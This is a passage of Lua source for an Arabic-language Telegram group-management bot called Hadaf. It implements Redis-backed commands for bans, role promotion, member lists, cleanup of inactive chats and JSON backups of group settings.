tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حظر عام @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^الغاء العام @(.*)$") then
function FunctionStatus(arg, result)
if (result.id_) then
Send_Options(msg,result.id_,"reply","✅┇تم الغاء حظره عام من المجموعات")  
redis:srem(bot_id.."Hadaf:Removal:User:Groups", result.id_)
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء العام @(.*)$") }, FunctionStatus, nil)
elseif text and text:match("^اضف مطور @(.*)$") then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Hadaf:Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم ترقيته مطور في البوت")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^اضف مطور @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^حذف مطور @(.*)$") then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Hadaf:Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم تنزيله من المطورين")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^حذف مطور @(.*)$")}, FunctionStatus, nil)
elseif text =='احصائيات البوت 📑' then 
send(msg.chat_id_, msg.id_,'*📋┇عدد احصائيات البوت الكامله \n━━━━━━━━━━━━━\n📮┇عدد المجموعات : '..(redis:scard(bot_id..'Hadaf:ChekBotAdd') or 0)..'\n👤┇عدد المشتركين : '..(redis:scard(bot_id..'Hadaf:Num:User:Pv') or 0)..'*')
elseif text and text:match("^تعيين عدد الاعضاء (%d+)$") then
redis:set(bot_id..'Hadaf:Num:Add:Bot',text:match("تعيين عدد الاعضاء (%d+)$") ) 
send(msg.chat_id_, msg.id_,'*✅┇ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعيين عدد الاعضاء (%d+)$")..' عضو *')
elseif text == 'حذف كليشه المطور' then
redis:del(bot_id..'Hadaf:Texting:DevHadaf')
send(msg.chat_id_, msg.id_,'✅┇ تم حذف كليشه المطور')
elseif text == "تنظيف المشتركين 🚯" then
local pv = redis:smembers(bot_id..'Hadaf:Num:User:Pv')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
redis:srem(bot_id..'Hadaf:Num:User:Pv',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'👤┇لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*👥┇عدد المشتركين الان ←{ '..#pv..' }\n⚠️┇تم العثور على ←{ '..sendok..' } مشترك قام بحظر البوت\n✅┇اصبح عدد المشتركين الان ←{ '..ok..' } مشترك *')   
end
end
end,nil)
end,nil)
end
return false
elseif text == "تنظيف المجموعات 🔄" then
local group = redis:smembers(bot_id..'Hadaf:ChekBotAdd')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'👥┇لا توجد مجموعات وهميه ')   
else
local taha = (w + q)
local sendok = #group - taha
if q == 0 then
taha = ''
else
taha = '\n🚯┇ تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
Hadaf = ''
else
Hadaf = '\n🚯┇ تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'*👥┇ عدد المجموعات الان ← { '..#group..' } مجموعه '..Hadaf..''..taha..'\n🔘┇اصبح عدد المجموعات الان ← { '..sendok..' } مجموعات*\n')   
end
end
end,nil)
end
return false
elseif text == 'جلب نسخة خزن القروبات 📦' then
local Groups = redis:smembers(bot_id..'Hadaf:ChekBotAdd')  
local Get_Json = '{"IdBot": '..bot_id..'Hadaf:,"Groups":{'  
for k,v in pairs(Groups) do   
local President = redis:smembers(bot_id.."Hadaf:President:Group"..v)
local Constructor = redis:smembers(bot_id.."Hadaf:Constructor:Group"..v)
local Manager = redis:smembers(bot_id.."Hadaf:Manager:Group"..v)
local Admin = redis:smembers(bot_id.."Hadaf:Admin:Group"..v)
local Vips = redis:smembers(bot_id.."Hadaf:Vip:Group"..v)
local LinkGroup = redis:get(bot_id.."Hadaf:link:set:Group"..v) 
local WelcomeGroup = redis:get(bot_id.."Hadaf:Get:Welcome:Group"..v) or ''
local Status_Dev = redis:get(bot_id.."Hadaf:Developer:Bot:Reply"..v) 
local Status_Prt = redis:get(bot_id.."Hadaf:President:Group:Reply"..v) 
local Status_Cto = redis:get(bot_id.."Hadaf:Constructor:Group:Reply"..v) 
local Status_Own = redis:get(bot_id.."Hadaf:Manager:Group:Reply"..v) 
local Status_Md = redis:get(bot_id.."Hadaf:Admin:Group:Reply"..v) 
local Status_Vip = redis:get(bot_id.."Hadaf:Vip:Group:Reply"..v) 
local Status_Mem = redis:get(bot_id.."Hadaf:Mempar:Group:Reply"..v) 
if k == 1 then
Get_Json = Get_Json..'"'..v..'":{'
else
Get_Json = Get_Json..',"'..v..'":{'
end
if #President ~= 0 then 
Get_Json = Get_Json..'"President":['
for k,v in pairs(President) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Constructor ~= 0 then
Get_Json = Get_Json..'"Constructor":['
for k,v in pairs(Constructor) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Manager ~= 0 then
Get_Json = Get_Json..'"Manager":['
for k,v in pairs(Manager) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Admin ~= 0 then
Get_Json = Get_Json..'"Admin":['
for k,v in pairs(Admin) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Vips ~= 0 then
t = t..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if Status_Dev then
Get_Json = Get_Json..'"Status_Dev":"'..Status_Dev..'",'
end
if Status_Prt then
Get_Json = Get_Json..'"Status_Prt":"'..Status_Prt..'",'
end
if Status_Cto then
Get_Json = Get_Json..'"Status_Cto":"'..Status_Cto..'",'
end
if Status_Own then
Get_Json = Get_Json..'"Status_Own":"'..Status_Own..'",'
end
if Status_Md then
Get_Json = Get_Json..'"Status_Md":"'..Status_Md..'",'
end
if Status_Vip then
Get_Json = Get_Json..'"Status_Vip":"'..Status_Vip..'",'
end
if Status_Mem then
Get_Json = Get_Json..'"Status_Mem":"'..Status_Mem..'",'
end
if LinkGroup then
Get_Json = Get_Json..'"LinkGroup":"'..LinkGroup..'",'
end
Get_Json = Get_Json..'"WelcomeGroup":"'..WelcomeGroup..'"}'
end
Get_Json = Get_Json..'}}'
local File = io.open('./lib/'..bot_id..'.json', "w")
File:write(Get_Json)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./lib/'..bot_id..'.json', '\n✅┇تم جلب نسخه خاصه بالقروبات\n⚠️️┇يحتوي الملف على {'..#Groups..'} مجموعه')
elseif text == 'تفعيل تواصل البوت 🔔' then  
redis:del(bot_id..'Hadaf:Lock:Twasl') 
send(msg.chat_id_, msg.id_,'🔘┇ تم تفعيل التواصل ') 
elseif text == 'تعطيل تواصل البوت 🔕' then  
redis:set(bot_id..'Hadaf:Lock:Twasl',true) 
send(msg.chat_id_, msg.id_,'🔘┇ تم تعطيل التواصل ') 
end
end 
end
if TypeForChat == ("ForSuppur") then
if text ==  ""..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف")..' وش رايك بهذا' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id.."Hadaf:Fun:Bots"..msg.chat_id_) then     
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, function(Arg,Data) 
local Text_Fun = {'محبوب ⭐️','جميل 🧡','اخلاقه تُدرس 🌸', 'متكبر 🔥','كريم 🌿','سحبه ✨','غيمه ☁️','لحد يتكلم معه ❌','قلبه ابيض 🤍','غثيث 💜'} 
send(msg.chat_id_, Data.id_,''..Text_Fun[math.random(#Text_Fun)]..'')   
end,nil)
return false
elseif text == ""..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف")..' وش رايك بهذي' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id.."Hadaf:Fun:Bots"..msg.chat_id_) then    
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(Arg, Data) 
local Text_Fun = {'محبوبه ⭐️','جميله 🧡','اخلاقها تُدرس 🌸', 'متكبره 🔥','كريمه 🌿','سحبه ✨','غيمه ☁️','لحد يتكلم معها ❌','قلبها ابيض 🤍','غثيثه 💜'} 
send(msg.chat_id_,Data.id_,''..Text_Fun[math.random(#Text_Fun)]..'') 
end,nil)
return false
end    
if text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 and Dev_Hadaf(msg) then   
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(Arg, Data)   
if Data.content_.document_ then 
SetFile_Groups(msg,msg.chat_id_,Data.content_.document_.document_.persistent_id_ ,Data.content_.document_.file_name_)
end;end,nil)
end

if text == 'جلب نسخه احتياطيه' and Dev_Hadaf(msg) or text == 'جلب نسخه القروبات' and Dev_Hadaf(msg) then

local Groups = redis:smembers(bot_id..'Hadaf:ChekBotAdd')  
local Get_Json = '{"IdBot": '..bot_id..'Hadaf:,"Groups":{'  
for k,v in pairs(Groups) do   
local President = redis:smembers(bot_id.."Hadaf:President:Group"..v)
local Constructor = redis:smembers(bot_id.."Hadaf:Constructor:Group"..v)
local Manager = redis:smembers(bot_id.."Hadaf:Manager:Group"..v)
local Admin = redis:smembers(bot_id.."Hadaf:Admin:Group"..v)
local Vips = redis:smembers(bot_id.."Hadaf:Vip:Group"..v)
local LinkGroup = redis:get(bot_id.."Hadaf:link:set:Group"..v) 
local WelcomeGroup = redis:get(bot_id.."Hadaf:Get:Welcome:Group"..v) or ''
local Status_Dev = redis:get(bot_id.."Hadaf:Developer:Bot:Reply"..v) 
local Status_Prt = redis:get(bot_id.."Hadaf:President:Group:Reply"..v) 
local Status_Cto = redis:get(bot_id.."Hadaf:Constructor:Group:Reply"..v) 
local Status_Own = redis:get(bot_id.."Hadaf:Manager:Group:Reply"..v) 
local Status_Md = redis:get(bot_id.."Hadaf:Admin:Group:Reply"..v) 
local Status_Vip = redis:get(bot_id.."Hadaf:Vip:Group:Reply"..v) 
local Status_Mem = redis:get(bot_id.."Hadaf:Mempar:Group:Reply"..v) 
if k == 1 then
Get_Json = Get_Json..'"'..v..'":{'
else
Get_Json = Get_Json..',"'..v..'":{'
end
if #President ~= 0 then 
Get_Json = Get_Json..'"President":['
for k,v in pairs(President) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Constructor ~= 0 then
Get_Json = Get_Json..'"Constructor":['
for k,v in pairs(Constructor) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Manager ~= 0 then
Get_Json = Get_Json..'"Manager":['
for k,v in pairs(Manager) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Admin ~= 0 then
Get_Json = Get_Json..'"Admin":['
for k,v in pairs(Admin) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if #Vips ~= 0 then
Get_Json = Get_Json..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..'],'
end
if Status_Dev then
Get_Json = Get_Json..'"Status_Dev":"'..Status_Dev..'",'
end
if Status_Prt then
Get_Json = Get_Json..'"Status_Prt":"'..Status_Prt..'",'
end
if Status_Cto then
Get_Json = Get_Json..'"Status_Cto":"'..Status_Cto..'",'
end
if Status_Own then
Get_Json = Get_Json..'"Status_Own":"'..Status_Own..'",'
end
if Status_Md then
Get_Json = Get_Json..'"Status_Md":"'..Status_Md..'",'
end
if Status_Vip then
Get_Json = Get_Json..'"Status_Vip":"'..Status_Vip..'",'
end
if Status_Mem then
Get_Json = Get_Json..'"Status_Mem":"'..Status_Mem..'",'
end
if LinkGroup then
Get_Json = Get_Json..'"LinkGroup":"'..LinkGroup..'",'
end
Get_Json = Get_Json..'"WelcomeGroup":"'..WelcomeGroup..'"}'
end
Get_Json = Get_Json..'}}'
local File = io.open('./lib/'..bot_id..'.json', "w")
File:write(Get_Json)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./lib/'..bot_id..'.json', '\n✅┇تم جلب نسخه خاصه بالقروبات\n⚠️️┇يحتوي الملف على {'..#Groups..'} مجموعه')
end
if text == ("مسح قائمه العام") and Dev_Hadaf(msg) or text == ("مسح المحظورين عام") and Dev_Hadaf(msg) then

redis:del(bot_id.."Hadaf:Removal:User:Groups")
send(msg.chat_id_, msg.id_, "🗑┇تم مسح المحظورين عام من البوت")
elseif text == ("مسح المطورين") and Dev_Hadaf(msg) then

redis:del(bot_id.."Hadaf:Developer:Bot")
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المطورين من البوت  ")
elseif text == ("مسح المنشئين الاساسين") and DeveloperBot(msg) or text == "مسح الاساسين" and DeveloperBot(msg)  then

redis:del(bot_id.."Hadaf:President:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المنشئين الاساسيين في المجموعه")
elseif text == ("مسح المنشئين الاساسين") or text == "مسح الاساسين" then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then

redis:del(bot_id.."Hadaf:President:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المنشئين الاساسيين في المجموعه")
end
end,nil)
elseif text == ("مسح المنشئين") and PresidentGroup(msg) then

redis:del(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المنشئين في المجموعه")
elseif text == ("مسح المدراء") and Constructor(msg) then

redis:del(bot_id.."Hadaf:Manager:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المدراء في المجموعه")
elseif text == ("مسح الادمنيه") and Owner(msg) then

redis:del(bot_id.."Hadaf:Admin:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح الادمنيه في المجموعه")
elseif text == ("مسح المميزين") and Admin(msg) then

redis:del(bot_id.."Hadaf:Vip:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المميزين في المجموعه")
elseif text == ("مسح المكتومين") and Admin(msg) then

redis:del(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇ تم مسح المكتومين في المجموعه")
elseif text == ("مسح المحظورين") and Admin(msg) then

redis:del(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "🗑┇تم مسح المحظورين في المجموعه")
elseif text == "حذف الاوامر المضافه" and Constructor(msg) or text == "مسح الاوامر المضافه" and Constructor(msg) then 

local list = redis:smembers(bot_id.."Hadaf:Command:List:Group"..msg.chat_id_)
for k,v in pairs(list) do
redis:del(bot_id.."Hadaf:Get:Reides:Commands:Group"..msg.chat_id_..":"..v)
redis:del(bot_id.."Hadaf:Command:List:Group"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"✅┇تم مسح جميع الاوامر التي تم اضافتها")  
elseif text == "مسح الصلاحيات" and Constructor(msg) then

local list = redis:smembers(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_)
for k,v in pairs(list) do;redis:del(bot_id.."Hadaf:Add:Validity:Group:Rt"..v..msg.chat_id_);redis:del(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_);end
send(msg.chat_id_, msg.id_,"✅┇تم مسح صلاحيات المجموعه")
elseif text == ("قائمه العام") and Dev_Hadaf(msg) or text == ("المحظورين عام") and Dev_Hadaf(msg) then

local list = redis:smembers(bot_id.."Hadaf:Removal:User:Groups")
Gban = "\n📄┇قائمة المحظورين عام في البوت\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Gban = Gban..""..k.."~ : [@"..username.."]\n"
else
Gban = Gban..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Gban = "⚠️┇لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, Gban)
elseif text == ("المطورين") and Dev_Hadaf(msg) then

local list = redis:smembers(bot_id.."Hadaf:Developer:Bot")
Sudos = "\n📄┇قائمة مطورين في البوت \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Sudos = Sudos..""..k.."~ : [@"..username.."]\n"
else
Sudos = Sudos..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Sudos = "⚠️┇لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, Sudos)
elseif text == "المنشئين الاساسيين" and DeveloperBot(msg) or text == "الاساسيين" and DeveloperBot(msg) then

local list = redis:smembers(bot_id.."Hadaf:President:Group"..msg.chat_id_)
Asase = "\n📄┇قائمة المنشئين الاساسين في المجموعه\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Asase = Asase..""..k.."~ : [@"..username.."]\n"
else
Asase = Asase..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Asase = "⚠️┇لا يوجد منشئين اساسيين"
end
send(msg.chat_id_, msg.id_, Asase)
elseif text == "المنشئين الاساسيين" or text == "الاساسيين" then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then

local list = redis:smembers(bot_id.."Hadaf:President:Group"..msg.chat_id_)
Asase = "\n📄┇قائمة المنشئين الاساسين في المجموعه\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Asase = Asase..""..k.."~ : [@"..username.."]\n"
else
Asase = Asase..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Asase = "⚠️┇لا يوجد منشئين اساسيين"
end
send(msg.chat_id_, msg.id_, Asase)
end
end,nil)
elseif text == ("المنشئين") and PresidentGroup(msg) then

local list = redis:smembers(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_)
Monsh = "\n📄┇قائمة منشئين المجموعه \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Monsh = Monsh..""..k.."~ : [@"..username.."]\n"
else
Monsh = Monsh..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Monsh = "⚠️┇لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, Monsh)
elseif text == ("المدراء") and Constructor(msg) then

local list = redis:smembers(bot_id.."Hadaf:Manager:Group"..msg.chat_id_)
Moder = "\n📄┇قائمة المدراء في المجموعه \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Moder = Moder..""..k.."~ : [@"..username.."]\n"
else
Moder = Moder..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Moder = "⚠️┇لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, Moder)
elseif text == ("الادمنيه") and Owner(msg) then

local list = redis:smembers(bot_id.."Hadaf:Admin:Group"..msg.chat_id_)
Admin = "\n📄┇قائمة الادمنيه في المجموعه\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Admin = Admin..""..k.."~ : [@"..username.."]\n"
else
Admin = Admin..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Admin = "⚠️┇لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, Admin)
elseif text == ("المميزين") and Admin(msg) then
local list = redis:smembers(bot_id.."Hadaf:Vip:Group"..msg.chat_id_)
Vips = "\n📄┇قائمة المميزين في المجموعه \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Vips = Vips..""..k.."~ : [@"..username.."]\n"
else
Vips = Vips..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Vips = "⚠️┇لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, Vips)
elseif text == ("المكتومين") and Admin(msg) then
local list = redis:smembers(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_)
Muted = "\n📄┇قائمة المكتومين في المجموعه\n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Muted = Muted..""..k.."~ : [@"..username.."]\n"
else
Muted = Muted..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Muted = "⚠️┇لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, Muted)
elseif text == ("المحظورين") and Admin(msg) then
local list = redis:smembers(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_)
Bans = "\n📄┇قائمة المحظورين في المجموعه \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
local username = redis:get(bot_id.."Hadaf:Save:Username" .. v)
if username then
Bans = Bans..""..k.."~ : [@"..username.."]\n"
else
Bans = Bans..""..k.."~ : `"..v.."`\n"
end
end
if #list == 0 then
Bans = "⚠️┇لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, Bans)
elseif text == "الصلاحيات" and Admin(msg) then 
local list = redis:smembers(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد صلاحيات مضافه هنا")
return false
end
Validity = "\n⛔┇قائمة الصلاحيات المضافه \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
var = redis:get(bot_id.."Hadaf:Add:Validity:Group:Rt"..v..msg.chat_id_)
if var then
Validity = Validity..""..k.."- "..v.." ~ ("..var..")\n"
else
Validity = Validity..""..k.."- "..v.."\n"
end
end
send(msg.chat_id_, msg.id_,Validity)
elseif text == "الاوامر المضافه" and Constructor(msg) then
local list = redis:smembers(bot_id.."Hadaf:Command:List:Group"..msg.chat_id_.."")
Command = "🔰┇قائمه الاوامر المضافه  \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
Commands = redis:get(bot_id.."Hadaf:Get:Reides:Commands:Group"..msg.chat_id_..":"..v)
if Commands then 
Command = Command..""..k..": ("..v..") ← {"..Commands.."}\n"
else
Command = Command..""..k..": ("..v..") \n"
end
end
if #list == 0 then
Command = "🔰┇لا توجد اوامر اضافيه"
end
send(msg.chat_id_, msg.id_,"["..Command.."]")
elseif text == "نداء للكل" and Admin(msg) then
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""), offset_ = 0,limit_ = 200},function(ta,taha)
local t = "\n⛔┇ قائمة الاعضاء \n━━━━━━━━━━━━━\n"
x = 0
local list = taha.members_
for k, v in pairs(list) do
x = x + 1
if redis:get(bot_id.."Hadaf:Save:Username"..v.user_id_) then
t = t..""..x.." : [@"..redis:get(bot_id.."Hadaf:Save:Username"..v.user_id_).."]\n"
else
t = t..""..x.." : "..v.user_id_.."\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
elseif text == ("حظر عام") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠️┇لا تسطيع حظر البوت عام")
return false 
end
if Dev_Hadaf_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "⚠️┇لا تستطيع حظر المطور الاساسي عام")
return false 
end
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم حظره عام من المجموعات")  
redis:sadd(bot_id.."Hadaf:Removal:User:Groups", result.sender_user_id_)
KickGroup(result.chat_id_, result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("الغاء العام") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Removal:User:Groups", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم الغاء حظره عام من المجموعات")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("اضف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:Developer:Bot", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته مطور في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("حذف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and Dev_Hadaf(msg) then

function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:Developer:Bot", result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من المطورين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot(msg) then
 
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته منشئ اساسي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and DeveloperBot(msg) then
 
function FunctionStatus(arg, result)
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 then
 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم ترقيته منشئ اساسي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end
end,nil)
elseif text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
